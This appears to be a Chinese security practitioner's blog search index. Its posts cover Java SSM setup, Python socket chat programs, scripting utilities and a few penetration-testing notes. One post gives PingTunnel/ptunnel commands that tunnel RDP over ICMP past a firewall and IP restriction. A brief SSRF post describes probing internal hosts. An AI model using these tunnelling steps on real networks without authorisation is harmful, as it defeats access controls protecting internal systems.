<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[安全开发]]></title>
    <url>%2F2020%2F08%2F30%2F%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%2F</url>
    <content type="text"><![CDATA[任务：熟悉JAVA WEB开发流程目标：1、了解并掌握JAVA WEB开发流程；2、熟悉基本框架；3、学会使用JAVA、CSS、HTML、JS等基础编程语言；4、尝试使用符合安全规范的编码进行编写。 所需安装的基础环境 jdk1.8+tomcat 7 +mysql 5.7 +eclipse 项目设计的知识点 ssm框架+easyui前端框架 SSM框架原理：SSM框架：spring、springMVC、mybaits。Spring：是一个容器，类似于一个对象工厂，按要求标记的类都会提前放入这个容器（感觉像是python 中各种第三方模块）便于直接调用，与我们平时开发接触最多的估计就是IOC容器，它可以装载bean（也就是我们java中的类，当然也包括service dao里面的），有了这个机制，我们就不用在每次使用这个类的时候为它初始化，很少看到关键字new。另外spring的aop，事务管理等等都是我们经常用到的。 SpringMVC：控制器和视图分发器 控制器：控制行为，BS原理:输入框输入url, DNS解析到IP地址，把url交给后端处理，这时候SpringMVC开始起作用，将tomcat拿到的url请求，分析判断交给谁处理，控制器判断要做什么处理，是否要查询数据库，和MyBatis,处理完后给用户一个回应，这个过程完成了视图分发。经过一系列逻辑处理后，返回什么样的数据 展示什么样的页面 它用于web层，相当于controller（等价于传统的servlet和struts的action），用来处理用户请求。举个例子，用户在地址栏输入http://网站域名/login，那么springmvc就会拦截到这个请求，并且调用controller层中相应的方法，（中间可能包含验证用户名和密码的业务逻辑，以及查询数据库操作，但这些都不是springmvc的职责），最终把结果返回给用户，并且返回相应的页面（当然也可以只返回json/xml等格式数据）。springmvc就是做前面和后面过程的活，与用户打交道！！ MyBatis：jdbc封装，本质就是java对数据库的操作。创建Sqlsessionfactory实例，其中实体、数据库表、mapper三者一一对应，缺一不可。 根据用户写的实体类和映射mapper文件之间的对应来获取到相应的sql操作去执行。 控制器根据请求参数判断要访问数据库，从容器Spring里面拿到要访问数据库的对象，拿到对象后告诉对象我要什么数据，然后对象跑到数据库调用方法，将拿到的数据交给Spring,拿到数据后，调用包含在一起的视图分发器，数据丢给他，视图分发器将数据渲染后放到指定页面，返回给用户 使用框架开发项目的难点： 最头疼的就是配置文件，框架开发中，要用到很多的配置项，配置文件也比较多，springboot框架可解决这个弊端 新建SSM框架，认识配置文件新建一个动态的WEB项目 文件目录：配置的文件的改动是很慎重的 不要死记硬背，理解即可，用的时候可以现查 WebContent：存放WEB资源，jsp问件 图片，css文件等等 src：存放java代码，新建包，约定俗称网址倒叙，大家公认，非必须这样写 com.ischoolbar.programmer 导入配置文件 web.xml:入口文件，tomcat服务器只认web.xml文件，导游，地图，中间人的角色介绍其他文件 成对出现 类似标签，不是一成不变的 ：在程序里是过滤的意思，可以过滤请求，比如编码格式 ：具体是那个类执行 : 一般加url 标记需要处理的url，分发器默认分发的目录是/，以他为基准 ：内容参数，介绍applicationContext.xml给tomcat服务器认识，路径在classpath:config/spring/ ：监听器，有org.springframework.web.context.ContextLoaderListener监听 :介绍classpath:config/log4j.properties给tomcat服务器认识，由listener-class调用param-value里面的文件加载执行 SpringMVC控制器的本质是servlet,servlet是最小单元，SpringMVC是句子，servlet是单词 ：启动状态，无所谓，默认是1 ：项目一启动要显示的文件 Spring容器呀~ applicationContext.xml 固定格式，只需修改相应的版本号 context:component-scan/ ：上下文组件扫描：去com.ischoolbar.programmer这个包下，扫描类，这三个字标记的关键字Component（标记实体的）、Repository（用来标记数据库操作层里的 dao层），Service（操作service的）都放到容器里，关键字是已经框架已经写好了的 context:property-placeholder/：放置了数据库的配置文件，文件名称与springmvc里面对应 ，加载db.properties中的 变量值com.mysql.jdbc.Driver，固定写法 可以不用db.properties，直接赋值在applicationContext.xml文件里 但是不符合框架规范，容易出错 配置死的东西 &lt;!-- spring 通过 sqlSessionFactoryBean 获取 sqlSessionFactory 工厂类 --&gt; &lt;bean id=&quot;sqlSessionFactory&quot; class=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&gt; &lt;property name=&quot;dataSource&quot; ref=&quot;dataSource&quot;&gt;&lt;/property&gt; &lt;!-- 扫描 po 包，使用别名 --&gt; &lt;property name=&quot;typeAliasesPackage&quot; value=&quot;com.ischoolbar.programmer.entity&quot;&gt;&lt;/property&gt; &lt;!-- 扫描映射文件 --&gt; &lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:config/mybatis/mapper/*.xml&quot;&gt;&lt;/property&gt; &lt;/bean&gt;sqlSessionFactory要把数据库里的表和实体一一对应起来，一个实体就是一张表，跟表对应的实体是放在哪个目录下，它要去扫描 Mybaits,实体和mapper文件一一对应，它找到这个实体然后跟数据库里的表建立对应关系，具体的sql操作，他会找到与实体对应的mapper文件，然后调用mapper文件里自己定义的sql文件再去执行具体的操作 告诉他去扫描这个包com.ischoolbar.programmer.entity，然后我们的实体类都在这个包下面，然后我们实体对应的映射文件在classpath:config/mybatis/mapper/*.xml，都去扫描放到容器里 dao文件：具体和数据库交互的那一层，具体操作，增删改查 service service.iml mapper文件写得slq语句映射到dao里面 平常使用的时候，就是在使用的地方用dao去调用跟mapper文件里面同名的方法，自动建立起关联 一个实体对应一个service，对应一个service.iml，对应一个dao,对应一个mapper文件，都是一一对应的，都是框架规定的，为了结构清晰 db.properties开发项目中用到的很少 datasource.connection.driver_class：变量名 datasource.connection.url=jdbc:mysql://localhost:3306/db_base_project?useUnicode=true&amp;characterEncoding=utf-8 db_base_project：数据名称 SpringMVC 固定格式 告诉SpringMVC控制器的类是写在哪个包下面的，扫描这个包下的类，凡是用.Controller注解的类加载进来，不是这个关键字注解的类不要加载进来 &lt;context:component-scan base-package=”com.ischoolbar.programmer.controller”&gt; &lt;context:include-filter type=”annotation” expression=”org.springframework.stereotype.Controller” /&gt; 视图分发： 写好的类，不变的org.springframework.web.servlet.view.InternalResourceViewResolver &lt;!-- 配置视图解析器 --&gt; &lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;&gt;&lt;/property&gt; &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt; &lt;/bean&gt;prefix：前缀是当你分发视图的时候，在controller里面定义的视图，前面加上字符串/WEB-INF/views/，后面加字符串.jsp，然后去找相应文件，然后把数据渲染到那个文件上展现给用户 运行hello ssm文件。路径为 1&lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;&gt;&lt;/property&gt;+return &quot;system/index&quot;;+&lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt; 从网上找套精致的模板套上即可 总结web.xml个人理解类似于网关，进入另一个环境的入口。 SpringMVC; 类似于路由表，含有路由（url）条目,负责给请求URL指路。 Spring是一个大的工具库，储存了很多工具，方便控制器直接调用]]></content>
  </entry>
  <entry>
    <title><![CDATA[多线程通信]]></title>
    <url>%2F2020%2F06%2F26%2F%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[目标：用python模拟多人聊天服务器以及客户端（带图形化界面） 需要用到的Python知识点： 网络编程：socket 多线程：threading 图像化编程：tkinter 首先要模拟出一个服务器，以供客户端连接，注意这里要用死循环，要让服务区一直处于开发的状态 其次运用多线程，因为多线程共享变量而且可以并发的执行操作，否则服务器只可以连接一个客户端 服务端： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import tkinterimport socket, threadingwin = tkinter.Tk() # 创建主窗口win.title(&apos;模拟服务器&apos;)win.geometry(&quot;400x400+200+20&quot;)users = &#123;&#125;#用户字典，也可以连接数据库def run(ck, ca): userName = ck.recv(1024)#接受客户端发送的信息以1k作为单位这里接受到的信息为byte类型 users[userName.decode(&quot;utf-8&quot;)] = ck#解码并储存用户的信息 #print(users) printStr = &quot;&quot; + userName.decode(&quot;utf-8&quot;) + &quot;连接\n&quot;#在连接显示框中显示是否连接成功 text.insert(tkinter.INSERT, printStr) while True: rData = ck.recv(1024)#接受客户端发送的信息以1k作为单位这里接受到的信息为byte类型 dataStr = rData.decode(&quot;utf-8&quot;) infolist = dataStr.split(&quot;:&quot;)#分割字符串从而得到所要发送的用户名和客户端所发送的信息 users[infolist[0]].send((userName.decode(&quot;utf-8&quot;) + &quot;说&quot; + infolist[1]).encode(&quot;utf&quot;)) #要发送信息的客户端向目标客户端发送信息def start(): ipStr = eip.get()#从输入端中获取ip portStr = eport.get()#从输入端中获取端口，注意端口取得时候不能被占用（可以取8080，9876，等） server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#socked所准守ipv4或ipv6，和相关协议的 server.bind((ipStr, int(portStr)))#绑定ip和端口号！！！1:注意输入的端口号是str型而这里的要传入int型 #2:bind()的参数是一个元组的形式 server.listen(10)#设置监听，和设置连接的最大的数量 printStr = &quot;服务器启动成功\n&quot;#，是否连接成功 text.insert(tkinter.INSERT, printStr)#显示在信息窗口中 while True:#这里用死循环是因为模拟的服务器要一直运行 ck, ca = server.accept()#接受所连接的客户端的信息 # 其中ca是ip和端口号组成的元组，ck有关客户端的信息 t = threading.Thread(target=run, args=(ck, ca))#每连接一个客户端就开启一个线程 #其中Thread函数中的传入函数的参数也是以元组的形式 t.start()#开启线程def startSever(): s = threading.Thread(target=start)#启用一个线程开启服务器 s.start()#开启线程#下面是关于界面的操作labelIp = tkinter.Label(win, text=&apos;ip&apos;).grid(row=0, column=0)labelPort = tkinter.Label(win, text=&apos;port&apos;).grid(row=1, column=0)eip = tkinter.Variable()eport = tkinter.Variable()entryIp = tkinter.Entry(win, textvariable=eip).grid(row=0, column=1)entryPort = tkinter.Entry(win, textvariable=eport).grid(row=1, column=1)button = tkinter.Button(win, text=&quot;启动&quot;, command=startSever).grid(row=2, column=0)text = tkinter.Text(win, height=5, width=30)labeltext = tkinter.Label(win, text=&apos;连接消息&apos;).grid(row=3, column=0)text.grid(row=3, column=1)win.mainloop() 客户端1： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# -*- coding: utf-8 -*import tkinterimport socketimport threadingwin = tkinter.Tk()win.title(&quot;客户端1&quot;)win.geometry(&quot;400x400+200+20&quot;)ck = None#用于储存客户端的信息def getInfo(): while True: data = ck.recv(1024)#用于接受服务其发送的信息 text.insert(tkinter.INSERT, data.decode(&quot;utf-8&quot;))#显示在信息框上def connectServer(): global ck ipStr = eip.get() portStr = eport.get() userStr = euser.get() client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#socked所准守ipv4或ipv6，和相关协议的 client.connect((ipStr, int(portStr)))#连接ip和端口号！！！1:注意输入的端口号是str型而这里的要传入int型 #2:bind()的参数是一个元组的形式 client.send(userStr.encode(&quot;utf-8&quot;)) ck = client t = threading.Thread(target=getInfo) t.start()def sendMail(): friend = efriend.get() sendStr = esend.get() sendStr = friend + &quot;:&quot; + sendStr ck.send(sendStr.encode(&quot;utf-8&quot;))#下面是界面labelUse = tkinter.Label(win, text=&quot;userName&quot;).grid(row=0, column=0)euser = tkinter.Variable()entryUser = tkinter.Entry(win, textvariable=euser).grid(row=0, column=1)labelIp = tkinter.Label(win, text=&quot;ip&quot;).grid(row=1, column=0)eip = tkinter.Variable()entryIp = tkinter.Entry(win, textvariable=eip).grid(row=1, column=1)labelPort = tkinter.Label(win, text=&quot;port&quot;).grid(row=2, column=0)eport = tkinter.Variable()entryPort = tkinter.Entry(win, textvariable=eport).grid(row=2, column=1)button = tkinter.Button(win, text=&quot;启动&quot;, command=connectServer).grid(row=3, column=0)text = tkinter.Text(win, height=5, width=30)labeltext= tkinter.Label(win, text=&quot;显示消息&quot;).grid(row=4, column=0)text.grid(row=4, column=1)esend = tkinter.Variable()labelesend = tkinter.Label(win, text=&quot;发送的消息&quot;).grid(row=5, column=0)entrySend = tkinter.Entry(win, textvariable=esend).grid(row=5, column=1)efriend = tkinter.Variable()labelefriend= tkinter.Label(win, text=&quot;发给谁&quot;).grid(row=6, column=0)entryFriend = tkinter.Entry(win, textvariable=efriend).grid(row=6, column=1)button2 = tkinter.Button(win, text=&quot;发送&quot;, command=sendMail).grid(row=7, column=0)win.mainloop() 客户端2： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# -*- coding: utf-8 -*import tkinterimport socketimport threadingwin = tkinter.Tk()win.title(&quot;客户端2&quot;)win.geometry(&quot;400x400+200+20&quot;)ck = None#用于储存客户端的信息def getInfo(): while True: data = ck.recv(1024)#用于接受服务其发送的信息 text.insert(tkinter.INSERT, data.decode(&quot;utf-8&quot;))#显示在信息框上def connectServer(): global ck ipStr = eip.get() portStr = eport.get() userStr = euser.get() client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#socked所准守ipv4或ipv6，和相关协议的 client.connect((ipStr, int(portStr)))#连接ip和端口号！！！1:注意输入的端口号是str型而这里的要传入int型 #2:bind()的参数是一个元组的形式 client.send(userStr.encode(&quot;utf-8&quot;)) ck = client t = threading.Thread(target=getInfo) t.start()def sendMail(): friend = efriend.get() sendStr = esend.get() sendStr = friend + &quot;:&quot; + sendStr ck.send(sendStr.encode(&quot;utf-8&quot;))#下面是界面labelUse = tkinter.Label(win, text=&quot;userName&quot;).grid(row=0, column=0)euser = tkinter.Variable()entryUser = tkinter.Entry(win, textvariable=euser).grid(row=0, column=1)labelIp = tkinter.Label(win, text=&quot;ip&quot;).grid(row=1, column=0)eip = tkinter.Variable()entryIp = tkinter.Entry(win, textvariable=eip).grid(row=1, column=1)labelPort = tkinter.Label(win, text=&quot;port&quot;).grid(row=2, column=0)eport = tkinter.Variable()entryPort = tkinter.Entry(win, textvariable=eport).grid(row=2, column=1)button = tkinter.Button(win, text=&quot;启动&quot;, command=connectServer).grid(row=3, column=0)text = tkinter.Text(win, height=5, width=30)labeltext= tkinter.Label(win, text=&quot;显示消息&quot;).grid(row=4, column=0)text.grid(row=4, column=1)esend = tkinter.Variable()labelesend = tkinter.Label(win, text=&quot;发送的消息&quot;).grid(row=5, column=0)entrySend = tkinter.Entry(win, textvariable=esend).grid(row=5, column=1)efriend = tkinter.Variable()labelefriend= tkinter.Label(win, text=&quot;发给谁&quot;).grid(row=6, column=0)entryFriend = tkinter.Entry(win, textvariable=efriend).grid(row=6, column=1)button2 = tkinter.Button(win, text=&quot;发送&quot;, command=sendMail).grid(row=7, column=0)win.mainloop()]]></content>
  </entry>
  <entry>
    <title><![CDATA[UDP聊天]]></title>
    <url>%2F2020%2F06%2F26%2FUDP%E8%81%8A%E5%A4%A9%2F</url>
    <content type="text"><![CDATA[目标：使用 UDP 协议实现一个简易的聊天室，实现两个客户端之间的消息发送和接收 UDP 传输过程TCP协议：TCP 客户端和服务端必须先连接才可以传输数据：客户端先请求连接服务器，服务器接受连接请求，然后双方才可以通信。 UDP 协议:客户端只需要知道服务器的地址和端口号，就可以直接发送数据了。 客户端： 123456789101112131415161718# -*- coding: utf-8 -*import socket# 创建socketsk = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)addr = (&apos;172.20.10.16&apos;,6000)while True: #等待输入 msg = input(&apos;请输入，回车后发送：&apos;) #发送数据报 sk.sendto(msg.encode(&apos;utf-8&apos;),addr) #接收数据报 msg_recv,addr = sk.recvfrom(1024) #打印 print(msg_recv.decode(&apos;utf-8&apos;))# 关闭socketsk.close() 服务端 12345678910111213141516171819# -*- coding: utf-8 -*import socket#创建socketsk = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)#绑定IP和端口号sk.bind((&apos;172.20.10.16&apos;,6000))while True: #接受数据报 msg,addr=sk.recvfrom(1024) #打印 print(&apos;来自[%s:%s]的消息: %s&apos; % (addr[0], addr[1], msg.decode(&apos;utf-8&apos;))) #等待输入 inp = input(&apos;请输入，回车后发送：&apos;) #发送数据报 sk.sendto(inp.encode(&apos;utf-8&apos;),addr)sk.close() 实现效果： 参考资料：http://www.ityouknow.com/python/2019/12/25/python-udp-99.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[聊天服务器]]></title>
    <url>%2F2020%2F06%2F26%2F%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[目标：使用 TCP 协议实现一个简易的聊天室，实现两个客户端之间的消息发送和接收 客户端：1234567891011121314151617# -*- coding: utf-8 -*from socket import *HOST = &apos;172.20.10.16&apos; #服务器地址PORT = 2345 #服务器端口号BUFSIZ = 2048 #缓存区大小，单位是字节，这里设置了2k的缓冲区ADDR = (HOST,PORT) #连接服务器地址tcpCliSock = socket(AF_INET,SOCK_STREAM) #这里创建了一个TCP套接字tcpCliSock.connect(ADDR)while True: msg = input (&apos;请输入：&apos;) #输入数据 if not msg:break #如果msg为空，则跳出循环 tcpCliSock.send(msg.encode()) data = tcpCliSock.recv(BUFSIZ) if not data: break # 如果data为空，则跳出循环 print(data.decode()) 服务器端：123456789101112131415161718192021222324# -*- coding: utf-8 -*# 服务器from socket import *HOST = &apos;&apos;#主机地址PORT = 2345 # 服务器端口号BUFSIZ = 2048 # 缓存区大小，单位是字节，这里设定了2K的缓冲区ADDR = (HOST,PORT)tcpSerSock = socket(AF_INET,SOCK_STREAM) #创建一个TCP套接字tcpSerSock.bind(ADDR)#绑定地址tcpSerSock.listen(5) #最大连接数为5while True: #无限循环 print (&apos;尝试连接客户端。。。&apos;) tcpCliSock,addr = tcpSerSock.accept() #等待接收连接 print(&apos;链接成功，客户端地址为：&apos;, addr) while True: data = tcpCliSock.recv(BUFSIZ) #接受数据，BUFSIZ是缓存区大小 if not data:break #如果data为空，则跳出循环 print(data.decode()) #msg = &apos;&#123;&#125;服务器已接收 [自动回复]&apos;.format(ctime()) msg = input (&apos;请输入：&apos;) tcpCliSock.send(msg.encode()) tcpCliSock.close() #关闭连接 TCP Socket通信如下图所示，TCP通信的基本步骤如下： 服务端：socket—bind—listen—while(True){—accept—-recv—send—}—close 客户端：socket—————————————-connect—send—recv——-close 实现： 参考资料：https://www.pythonf.cn/read/14270 https://www.jianshu.com/p/89495c36f92b]]></content>
  </entry>
  <entry>
    <title><![CDATA[编写一个TCP协议的聊天服务器]]></title>
    <url>%2F2020%2F06%2F17%2F%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AATCP%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[目标：用python模拟多人聊天服务器以及客户端（带图形化界面）需要用到的Python知识点：网络编程：socket多线程：threading图形化编程：tkinter首先模拟一个服务器，以供客户端链接，用死循环，要让服务器一直处于开放的状态 运用多线程，因为多线程共享变量可以同时发出执行的动作，否则服务器只可以连接一个客户端 参考链接：https://blog.csdn.net/qq_41682681/article/details/80939682]]></content>
  </entry>
  <entry>
    <title><![CDATA[socket通信原理]]></title>
    <url>%2F2020%2F06%2F15%2Fsocket%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[目标： 使用 TCP 接收信息建立 socket 连接通道，可以相互之间传输数据 什么是socket？Python程序是通过socket提供的一系列方法完成客户端与服务器端的通信 socket在传输层和应用层之间，可以把socket理解为在传输层和应用层之间的一组通信接口，或者是一个抽象的通信设备，应用程序借助socket就能方便地与其他应用程序进行交流。 TCP/IP的四层模型： 应用层，在这一层上的有HTTP、DNS、FTP、SSH等。 传输层，在这一层上的有TCP、UDP等。 网络层，在这一层上的有IP、ARP等。 网络接口层，在这一层上的有以太网、PPP等。 socket的域程序中建立socket对象都使用了AF_INET这个参数，他表示这个socket是通过IPV4进行通信的 socket的协议在protocol上我们使用了SOCK_STREAM,表示tcp.除此之外我们还可以把他指定为SOCK_DGRAM表示 UDP TCP跟UDP的一些基本区别： TCP面向连接，UDP不面向连接。 TCP面向字节，不存在消息边界，可能存在粘包问题。UDP则面向报文。 TCP会尽力保证数据的可靠交付，而UDP默认不做保证。 TCP头部20字节，UDP头部8字节。 clent.py12345678910import socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)sock.bind((&apos;0.0.0.0&apos;,8000))sock.listen(5)while 1: cli_sock,cliaddr=sock.accept() req = cli_sock.recv(4096) cli_sock.send(b&apos;hello zsc0810&apos;) cli_sock.close() 客户端（1）sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 调用socket.socket建立一个socket对象，指定域(domain)和协议(protocol)，此时一个文件描述符会绑定到这个socket对象。 （2）sock.connect((‘127.0.0.1’, 8000)) 调用sock.connect通过指定的主机和端口连接到对端的服务器进程。 （3）sock.send(b’GET / HTTP/1.1\r\nHost: 127.0.0.1:8000\r\n\r\n’) 调用sock.send给服务器端发送数据。 （4）data = sock.recv(4096) 调用sock.recv接收服务器端发来的数据。 （5）sock.close() 调用sock.close关闭连接。 server.py12345678910import socketsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)sock.bind((&apos;0.0.0.0&apos;,8000))sock.listen(5)while 1: cli_sock,cliaddr=sock.accept() req = cli_sock.recv(4096) cli_sock.send(b&apos;hello zsc0810&apos;) cli_sock.close() 服务端(1)sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 调用socket.socket建立一个socket对象，指定域(domain)和协议(protocol)，此时一个文件描述符会绑定到这个socket对象 (2)sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) 调用sock.setsockopt设置这个socket选项，本例中把socket.SO_REUSEADDR设置为1，表示服务器端进程终止后，操作系统会为它绑定的端口保留一段时间，以防其他进程在它结束后抢占这个端口。 (3)sock.bind((‘127.0.0.1’,8000)) 调用sock.bind为这个socket对象绑定到一个地址上，它需要一个主机地址和端口组成的元组作为参数。 (4)sock.listen(5) 用sock.listen通知系统开始侦听来自客户端的连接，参数是在队列中最大的未连接数量 (5)sock.accept() 调用sock.accept阻塞调用直至返回一个元组，里面包含了用于与客户端进行对话的socket对象以及客户端的地址信息。 (6)req = cli_sock.recv(4096) 调用cli_sock.recv方法接受来自客户端发来的数据，在这个例子中拿到的是b’GET / HTTP/1.1\r\nHost: 127.0.0.1:8000\r\n\r\n’\。 (7)cli_sock.send(b’hello world’) 调用cli_sock.send方法把数据发送给客户端。 (8)cli_sock.close() 调用cli_sock.close结束连接。 三次握手 通过结果可以观察到服务器的进程的一些信息，服务器进程处于LISTEN\阶段，说明服务器处于保持着监听连接的状态： 参考链接：https://zhuanlan.zhihu.com/p/25354747]]></content>
  </entry>
  <entry>
    <title><![CDATA[自定义配置核查模板]]></title>
    <url>%2F2020%2F05%2F09%2F%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE%E6%A0%B8%E6%9F%A5%E6%A8%A1%E6%9D%BF%2F</url>
    <content type="text"><![CDATA[目标：满足不同客户实际业务场景需要，自定义设备配置核查项 以”检查是否关闭不必要的服务和端口 “为例，自定义操作流程如下： 步骤一：复制另存模板（为了便于演示，删除其他检查项） 步骤二：添加检查点，依次点击如图所示： 结果如下（参考其他系统服务检查点即可）： 步骤三调整检查点逻辑关系（&lt;- 只能从末尾删除）： 之后点击 即可完成： 验证：为了效果显示，修改命令，其他配置不变 默认模板的扫描报告 自定义模板后的扫描报告 BY JNB交付与服务部_ ZSC0810 2020/5/9]]></content>
  </entry>
  <entry>
    <title><![CDATA[icmp]]></title>
    <url>%2F2020%2F04%2F19%2Ficmp%2F</url>
    <content type="text"><![CDATA[两台机器间,除了允许相互ping 即icmp通信,其他的tcp/udp端口一律不允许,利用icmp隧道进行穿透 最终目的：1、让边界服务器作为imcp跳板,通过访问VPS的指定端口来转发到内网服务器的3389上2、实现的最终效果,即访问VPS的指定端口就相当于访问内网服务器的3389 环境如下：1、客户端访问内网服务器的3389,由于内网服务器开了防火墙且做了ip限制,没法直接从客户端上进行访问2、虽然内网服务器开启了防火墙,但在边界服务器能ping通内网服务器,即没有阻断它们之间的icmp通信 VPS与边界服务器上执行：yum install libpcap libpcap-devel flex bison -y tar xf PingTunnel-0.72.tar.gz cd PingTunnel make &amp;&amp; make install cd 边界服务器上：ptunnel 开启icmp隧道,等待外部连接 vps上：ptunnel -p 192.168.1.117 -lp 6666 -da 192.168.1.119 -dp 3389 -p 指定icmp跳板机ip-l 指定本地转发端口-da 指定最终要访问的机器ip-dp 指定最终要访问的机器端口 客户端上：mstsc 192.168.3.30:6666 效果图：]]></content>
  </entry>
  <entry>
    <title><![CDATA[ssrf]]></title>
    <url>%2F2020%2F04%2F18%2Fssrf%2F</url>
    <content type="text"><![CDATA[环境描述：1、内网server1应用映射到公网，客户端对server2不能通过公网访问 2、内网server2应用开放80、4443端口 正常页面： 内网资产探测探测存活IP: 发现存在资产http://192.168.1.124/ 内网资产开放端口探测开放端口： 发现资产http://192.168.1.124/ 开放4443端口]]></content>
  </entry>
  <entry>
    <title><![CDATA[python相关]]></title>
    <url>%2F2020%2F04%2F12%2Fpython%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[txt &amp; excel 操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import xlrdexcel_path = &quot;domain.xlsx&quot; # 57个# 打开文件，获取excel文件的workbook（工作簿）对象excel = xlrd.open_workbook(excel_path, encoding_override=&quot;utf-8&quot;)# 获取sheet对象all_sheet = excel.sheets()# 循环遍历每个sheet对象sheet_name = []sheet_row = []sheet_col = []for sheet in all_sheet: sheet_name.append(sheet.name) # print(&quot;该Excel共有&#123;0&#125;个sheet,当前sheet名称为&#123;1&#125;,该sheet共有&#123;2&#125;行,&#123;3&#125;列&quot; # .format(len(all_sheet), sheet.name, sheet.nrows, sheet.ncols))​ #​ date1=sheet.col_values(5) # print(date1) # 获取指定列的数据 # for each_col in range(sheet.ncols): # 依次获得每一列的数据 # print(&quot;当前为%s列：&quot; % each_col) # # print(sheet.col_values(each_col), type(sheet.col_values(each_col)))with open(&apos;1.txt&apos;) as f: # 47个 #line = f.readlines() lines = [] for line in f.readlines(): line=line.strip(&apos;\n&apos;) lines.append(line)date2=list(lines)# print((date2))filename = &apos;write_data.txt&apos;with open(filename,&apos;w&apos;) as f: # 如果filename不存在会自动创建， &apos;w&apos;表示写数据，写之前会清空文件中的原有数据！ for i in date2: if i not in date1: print(i,file=f)print(&apos;done&apos;) 批量解析域名123456789101112131415161718192021222324252627#!/usr/bin/env python# -*- coding:utf-8 -*-from socket import gethostbynamewith open(&apos;7.txt&apos;,&apos;r&apos;) as f: for line in f.readlines(): try: host = gethostbyname(line.strip(&apos;\n&apos;)) #域名反解析得到的IP except Exception as e: with open(&apos;error.txt&apos;,&apos;a+&apos;) as ERR: #error.txt为没有IP绑定的域名 ERR.write(line.strip()+ &apos;\n&apos;) else: with open(&apos;8.txt&apos;,&apos;a+&apos;) as r: # ****.txt 里面存储的是批量解析后的结果 r.write(line.strip(&apos;\n&apos;) + &apos; &apos;) #显示有ip绑定的域名，用空格隔开 print(line, host) r.write(host + &apos;\n&apos;) # if host != &quot;192.168.3.2&quot;: #筛选特定结果，具体代码实现如下 # if host != &quot;192.168.3.3&quot;: # with open(&apos;result.txt&apos;, &apos;a+&apos;) as f: # f.write(line.strip() +&apos; &apos;) #存储筛选后的域名 # f.write(host + &apos;\n&apos;) #存储筛选后的IP # else: # pass # else: # pass 爬虫1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import requestsfrom bs4 import BeautifulSoupimport osdef get_img(page_url, page): r = requests.get(page_url) respons = r.content soup = BeautifulSoup(respons, &apos;html.parser&apos;) images = [] for link in soup.find_all(&apos;img&apos;): img_raw = link.get(&apos;src&apos;) images.append(img_raw) folder_path = &apos;D:/photo/&apos; for index, i in enumerate(images): img_res = requests.get(&apos;http:&apos; + i) img_name = folder_path + str(page) + &apos;_&apos; + str(index + 1) + &apos;.png&apos; with open(img_name, &apos;wb&apos;) as file: file.write(img_res.content) file.flush() file.close() a = soup.find_all(title=&quot;Older Comments&quot;) return &apos;http:&apos; + a[0].get(&apos;href&apos;)# page_url = &apos;http://jandan.net/pic&apos;## for i in range(5):# page_url = get_img(page_url=page_url, page=i)def func_index(page): # print(page) return page + 1page = 0for i in range(10): page = func_index(page) print(page) 正则提取数据123456789101112131415161718192021222324252627282930313233343536import xlrdimport xlwtimport rework_book = xlrd.open_workbook(filename=&apos;1.xlsx&apos;)book_sheet = work_book.sheet_by_index(0)work_book2 = xlwt.Workbook(encoding=&apos;utf-8&apos;)book_sheet2 = work_book2.add_sheet(&apos;Work_Sheet&apos;)index = 0for info_index, info in enumerate(book_sheet.get_rows()): # print(info[6]) if info_index == 0: for i_index, i in enumerate(info): label = str(i).strip(&apos;text:&apos;).strip(&apos;number:&apos;).strip(&apos;empty:&apos;) book_sheet2.write(info_index, i_index, label=label[1:-1]) else: for i_index, i in enumerate(info): if i_index == 0 or i_index ==8: label = str(i).strip(&apos;text:&apos;).strip(&apos;number:&apos;).strip(&apos;empty:&apos;)[0:-2] book_sheet2.write(info_index, i_index, label=label) elif i_index == 3: re_ob = re.search( r&apos;(Host: ((1[0-9][0-9]\.)|(2[0-4][0-9]\.)|(25[0-5]\.)|([1-9][0-9]\.)|([0-9]\.))&#123;3&#125;((1[0-9][0-9])|(2[0-4][0-9])|(25[0-5])|([1-9][0-9])|([0-9]))(:)+[0-9]&#123;1,&#125;)|(Host: [\w\-_]+(\.[\w\-_]+)+([\w\-\.,@?^=%&amp;:/~\+#]*[\w\-\@?^=%&amp;/~\+#]))&apos;, str(info[6])) if re_ob is not None: book_sheet2.write(info_index, i_index, label=str(re_ob.group()).split(&apos;Host: &apos;)) 